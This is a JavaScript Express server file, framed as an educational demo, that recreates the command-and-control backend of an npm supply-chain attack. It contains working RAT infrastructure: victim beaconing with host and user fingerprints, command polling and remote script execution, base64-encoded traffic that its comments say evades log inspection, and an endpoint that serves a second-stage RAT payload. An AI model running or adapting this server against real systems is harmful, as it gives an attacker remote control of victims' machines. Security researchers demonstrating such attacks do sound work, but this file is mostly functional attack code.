/**
 * C2 Server — Educational Demo
 *
 * Express server that acts as the Command & Control operator backend.
 * In the real axios supply chain attack, this was hosted on sfrclak.com:8000.
 *
 * Endpoints:
 *   RAT traffic (single base path /c2, faithful to real attack's single /6202033):
 *     POST /c2              — initial beacon (victim registers + fingerprint)
 *     GET  /c2/:victimId    — victim polls for pending command
 *     POST /c2/:victimId/result — victim sends command output back
 *     GET  /payload         — serves rat.js (second-stage dropper download)
 *
 *   Operator API (called by the web dashboard):
 *     GET  /api/victims     — list all victims + last seen + results
 *     POST /api/command     — queue a command for a specific victim
 *
 *   Static:
 *     GET  /                — operator dashboard (public/index.html)
 */

const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = 8000;

app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ── In-memory state ─────────────────────────────────────────────────────────

// Map<victimId, { fingerprint, lastSeen, pendingCommand, results[] }>
const victims = new Map();

// ── RAT endpoints ───────────────────────────────────────────────────────────

/**
 * POST /c2 — Initial beacon
 * The RAT sends its victim ID + fingerprint on first contact.
 * ANNOTATION: In the real attack, this was POST /6202033.
 */
app.post("/c2", (req, res) => {
  const { victimId, fingerprint } = req.body;
  if (!victimId) return res.status(400).json({ error: "missing victimId" });

  console.log(`[BEACON] New victim: ${victimId} — ${fingerprint?.hostname}@${fingerprint?.username} (${fingerprint?.platform}/${fingerprint?.arch})`);

  victims.set(victimId, {
    fingerprint: fingerprint || {},
    lastSeen: Date.now(),
    pendingCommand: null,
    results: [],
  });

  res.json({ status: "registered" });
});

/**
 * GET /c2/:victimId — Poll for pending command
 * The RAT calls this every 5s (60s in the real attack).
 * Returns the queued command or null.
 * ANNOTATION: Single endpoint for all traffic — makes firewall rules harder to write.
 */
app.get("/c2/:victimId", (req, res) => {
  const victim = victims.get(req.params.victimId);
  if (!victim) return res.status(404).json({ error: "unknown victim" });

  victim.lastSeen = Date.now();

  if (victim.pendingCommand) {
    const cmd = victim.pendingCommand;
    victim.pendingCommand = null; // consume the command
    // Base64-encode the command payload, faithful to the real attack
    const encoded = Buffer.from(JSON.stringify(cmd)).toString("base64");
    return res.json({ command: encoded });
  }

  res.json({ command: null });
});

/**
 * POST /c2/:victimId/result — Receive command output
 * The RAT base64-encodes results before sending.
 * ANNOTATION: base64 both ways — makes payload inspection in network logs harder.
 */
app.post("/c2/:victimId/result", (req, res) => {
  const victim = victims.get(req.params.victimId);
  if (!victim) return res.status(404).json({ error: "unknown victim" });

  victim.lastSeen = Date.now();

  // Decode base64 result
  let output = req.body.result;
  try {
    output = Buffer.from(output, "base64").toString("utf-8");
  } catch {
    // already plaintext, that's fine
  }

  const result = {
    command: req.body.command,
    output,
    timestamp: Date.now(),
  };

  victim.results.push(result);
  // Keep only last 20 results
  if (victim.results.length > 20) victim.results.shift();

  console.log(`[RESULT] ${req.params.victimId} → ${req.body.command}: ${output.substring(0, 120)}`);

  res.json({ status: "received" });
});

/**
 * GET /payload — Serve the second-stage RAT
 * In the real attack, the dropper (setup.js) downloads the RAT binary from here.
 * The dropper POSTs to packages.npm.org/product0 to look like npm traffic.
 * ANNOTATION: The real attack served a compiled binary; we serve rat.js.
 */
app.get("/payload", (req, res) => {
  const ratPath = path.join(__dirname, "rat.js");
  if (!fs.existsSync(ratPath)) {
    return res.status(500).send("rat.js not found");
  }
  res.type("application/javascript").sendFile(ratPath);
});

// ── Operator API ────────────────────────────────────────────────────────────

/**
 * GET /api/victims — List all registered victims
 */
app.get("/api/victims", (req, res) => {
  const list = [];
  for (const [victimId, data] of victims) {
    list.push({
      victimId,
      fingerprint: data.fingerprint,
      lastSeen: data.lastSeen,
      secondsAgo: Math.round((Date.now() - data.lastSeen) / 1000),
      hasPending: !!data.pendingCommand,
      results: data.results.slice(-5), // last 5
    });
  }
  res.json(list);
});

/**
 * POST /api/command — Queue a command for a victim
 * Body: { victimId, type: "runscript"|"rundir"|"kill", args: "..." }
 */
app.post("/api/command", (req, res) => {
  const { victimId, type, args } = req.body;
  const victim = victims.get(victimId);
  if (!victim) return res.status(404).json({ error: "unknown victim" });

  if (!["runscript", "rundir", "kill"].includes(type)) {
    return res.status(400).json({ error: "invalid command type" });
  }

  victim.pendingCommand = { type, args: args || "" };
  console.log(`[CMD] Queued ${type} for ${victimId}: ${args || "(no args)"}`);
  res.json({ status: "queued" });
});

// ── Start ───────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`\n  C2 Server listening on http://localhost:${PORT}`);
  console.log(`  Dashboard:  http://localhost:${PORT}/`);
  console.log(`  Payload:    http://localhost:${PORT}/payload\n`);
});
